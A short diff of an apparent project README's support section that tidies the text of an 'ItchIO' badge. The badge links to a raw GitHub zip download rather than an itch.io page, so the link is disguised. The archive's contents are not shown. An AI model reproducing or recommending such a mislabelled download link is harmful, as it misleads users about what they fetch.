@@ -7,7 +7,7 @@ Please consider supporting:
 <img src="https://img.shields.io/badge/GitHub%20Sponsors-brightgreen" width="215" />
 </a>
 <a href="https://raw.githubusercontent.com/irmaosver-e/SGTH/main/SGTH.zip">
-<img src="https://img.shields.io/badge/ItchIO%20-brightred" width="150" />
+<img src="https://img.shields.io/badge/ItchIO-brightred" width="150" />
 </a>
 
 
